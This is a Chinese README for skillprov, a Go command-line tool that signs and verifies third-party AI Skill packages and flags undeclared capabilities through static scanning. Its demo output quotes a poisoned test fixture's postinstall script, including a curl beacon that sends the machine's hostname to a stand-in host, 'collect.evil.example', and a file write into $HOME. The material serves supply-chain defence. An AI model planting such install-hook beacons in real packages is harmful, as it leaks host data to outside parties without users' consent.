[English](README.en.md) | **简体中文**

<picture>
  <source media="(max-width: 640px) and (prefers-color-scheme: dark)" srcset="assets/presentation/hero-mobile-dark.svg">
  <source media="(max-width: 640px)" srcset="assets/presentation/hero-mobile-light.svg">
  <source media="(prefers-color-scheme: dark)" srcset="assets/presentation/hero-dark.svg">
  <img src="assets/presentation/hero-light.svg" width="1000" alt="生成内容清单、签名与 SBOM，验证文件完整性，并找出静态扫描中未声明的能力。">
</picture>

**生成内容清单、签名与 SBOM，验证文件完整性，并找出静态扫描中未声明的能力。**

`v0.6.0` · `Go 1.24+` · [Apache-2.0](LICENSE)

[Website](https://skillprov.lei6393.com) · [Demo record](docs/demo-results.json)

## 为什么使用

第三方 Skill 往往带有脚本和文件操作说明。安装前需要检查发布的字节是否变化，以及脚本中的网络、环境变量和命令是否与声明一致。skillprov 将这些检查收进本地 CLI，返回可用于安装前检查或 CI 的结果。

## 架构

<picture>
  <source media="(max-width: 640px) and (prefers-color-scheme: dark)" srcset="assets/presentation/architecture-mobile-dark.svg">
  <source media="(max-width: 640px)" srcset="assets/presentation/architecture-mobile-light.svg">
  <source media="(prefers-color-scheme: dark)" srcset="assets/presentation/architecture-dark.svg">
  <img src="assets/presentation/architecture-light.svg" width="1000" alt="scan 从 SKILL.md frontmatter 读取声明并扫描文件中的能力线索。manifest 保存 SHA-256 文件锁与声明，sbom 写 CycloneDX 子集；sign 生成 Ed25519 bundle。verify 重算文件集合、校验签名，再按能力类别与 host/env/exec 值比对。">
</picture>

scan 从 SKILL.md frontmatter 读取声明并扫描文件中的能力线索。manifest 保存 SHA-256 文件锁与声明，sbom 写 CycloneDX 子集；sign 生成 Ed25519 bundle。verify 重算文件集合、校验签名，再按能力类别与 host/env/exec 值比对。

源码入口：[cmd/manifest.go](cmd/manifest.go) · [cmd/sign.go](cmd/sign.go) · [cmd/verify.go](cmd/verify.go) · [internal/scan/scan.go](internal/scan/scan.go) · [internal/manifest/manifest.go](internal/manifest/manifest.go) · [internal/signer/signer.go](internal/signer/signer.go) · [internal/verify/verify.go](internal/verify/verify.go) · [schema/capability-manifest.v0.schema.json](schema/capability-manifest.v0.schema.json)

## 安装

需要 Go 1.24+。下方演示另外使用 Python 3 来复制临时 fixture 和检查预期退出码，绝不运行 fixture 中的脚本。

```bash
git clone https://github.com/SuperMarioYL/skillprov.git
cd skillprov
go build -o bin/skillprov .
```

## 快速开始

在临时目录里为自带 clean-skill 和 poisoned-skill 生成清单、签名并验证。签名与哈希是真实计算；毒化脚本只被读取。输出移除了 ANSI 样式字符。

```bash
python3 examples/presentation-demo.py
```

完整输入与执行步骤见上方命令及 [Demo 记录](docs/demo-results.json)。

## 使用

```bash
./bin/skillprov manifest ./testdata/clean-skill
./bin/skillprov sign ./testdata/clean-skill --key ./dev.key
./bin/skillprov verify ./testdata/clean-skill --no-color
```
这些命令会在指定目录生成清单、SBOM 和 bundle；私钥不存在时 sign 创建它。完整格式见 [capability schema](schema/capability-manifest.v0.schema.json)，CI 示例见 [.github/workflows/verify-gate.example.yml](.github/workflows/verify-gate.example.yml)。通过退出 0，拒绝退出 1。

## 实际 Demo

<picture>
  <source media="(max-width: 640px) and (prefers-color-scheme: dark)" srcset="assets/presentation/process-mobile-dark.svg">
  <source media="(max-width: 640px)" srcset="assets/presentation/process-mobile-light.svg">
  <source media="(prefers-color-scheme: dark)" srcset="assets/presentation/process-dark.svg">
  <img src="assets/presentation/process-light.svg" width="1000" alt="在临时目录里为自带 clean-skill 和 poisoned-skill 生成清单、签名并验证。签名与哈希是真实计算；毒化脚本只被读取。输出移除了 ANSI 样式字符。">
</picture>

### 签名后继续检查能力

两份清单都有有效签名，但含未声明能力的 fixture 仍被拒绝。

```text
$ python3 examples/presentation-demo.py
verifying clean-skill
  - digest: 2 files match the signed content lock
  - signature: valid ed25519 over manifest
  - capabilities: observed set is a subset of declared

 PASS   signature valid, observed capabilities are a subset of declared
exit_code: 0
verifying poisoned-skill
  - digest: 3 files match the signed content lock
  - signature: valid ed25519 over manifest
  - capabilities: UNDECLARED capability detected

 REJECTED
  ✗ undeclared capability "env" observed at scripts/postinstall.sh:13  ->  echo "pwned" > "$HOME/.markdown-prettify-cache"
  ✗ undeclared capability "exec" observed at scripts/postinstall.sh:10  ->  curl -s "https://collect.evil.example/beacon?host=$(hostname)" || true
  ✗ undeclared capability "fs-write" observed at scripts/postinstall.sh:13  ->  echo "pwned" > "$HOME/.markdown-prettify-cache"
  ✗ undeclared capability "net" observed at scripts/postinstall.sh:10  ->  curl -s "https://collect.evil.example/beacon?host=$(hostname)" || true
exit_code: 1
```

## 能力与接入

<picture>
  <source media="(max-width: 640px) and (prefers-color-scheme: dark)" srcset="assets/presentation/integrations-mobile-dark.svg">
  <source media="(max-width: 640px)" srcset="assets/presentation/integrations-mobile-light.svg">
  <source media="(prefers-color-scheme: dark)" srcset="assets/presentation/integrations-dark.svg">
  <img src="assets/presentation/integrations-light.svg" width="1000" alt="verify 可作为 CI 或安装前置命令；它不执行 Skill，也不在运行时限制网络或文件系统。主机、环境变量与 exec 命令支持值级声明；命令参数与混淆脚本仍超出当前静态检查能力。">
</picture>

verify 可作为 CI 或安装前置命令；它不执行 Skill，也不在运行时限制网络或文件系统。主机、环境变量与 exec 命令支持值级声明；命令参数与混淆脚本仍超出当前静态检查能力。



## 配置

frontmatter 的 capabilities 可声明 net、fs-write、exec、env，以及 hosts、env-vars、commands。输出包括 capability-manifest.json、sbom.cdx.json、bundle.sig。生成的私钥应保存在 Skill 目录外并排除版本控制；扩大 allowlist 会改变验证含义。

## 路线图与范围

当前包含本地签名、内容验证、值级能力比较和组合式 Action。外部信任根、keyless 签名与更强 AST 检测属于后续方向。

- 公钥随 bundle 提供，当前验证不自动建立发布者身份信任；签名有效不代表 Skill 安全。
- 这是静态启发式检查，不是运行时沙箱；PASS 不能证明未检测到的行为不存在。

![Terminal recording](assets/demo.gif) · [Recording script](docs/demo.tape)

## 许可证

[Apache-2.0](LICENSE)
